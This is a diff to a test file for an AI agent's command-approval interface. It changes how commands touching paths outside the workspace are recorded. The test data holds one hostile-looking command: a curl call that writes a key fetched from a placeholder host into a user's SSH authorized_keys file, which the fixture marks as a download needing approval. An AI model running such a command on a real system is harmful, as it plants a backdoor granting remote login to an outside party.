@@ -760,7 +760,12 @@ describe('la carte dit ce que la liste de l’agent a vu (#464) @cap:approuver-u
             category: 'download',
             state: 'ask',
             details: ['curl -o /home/k/.ssh/authorized_keys https://x/k'],
-            outside: ['/home/k/.ssh/authorized_keys'],
+            outside: [
+              {
+                command: 'curl -o /home/k/.ssh/authorized_keys https://x/k',
+                places: ['/home/k/.ssh/authorized_keys'],
+              },
+            ],
           },
         ],
       }),
